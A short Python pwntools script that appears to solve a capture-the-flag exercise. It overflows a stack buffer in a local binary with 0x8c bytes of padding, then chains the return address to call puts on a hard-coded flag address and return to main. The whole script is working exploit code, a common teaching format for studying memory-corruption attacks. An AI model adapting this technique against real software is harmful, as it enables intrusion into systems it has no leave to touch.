from pwn import *
s = process(['./vuln_oveflow','abc'])
raw_input('debug')
flag_add = 0x804a080
puts_add = 0x80484c0
main = 0x80486c9 
payload = 'a'*0x8c 
payload += p32(puts_add)
payload += p32(main)
payload += p32(flag_add)
s.sendline(payload)
s.interactive()
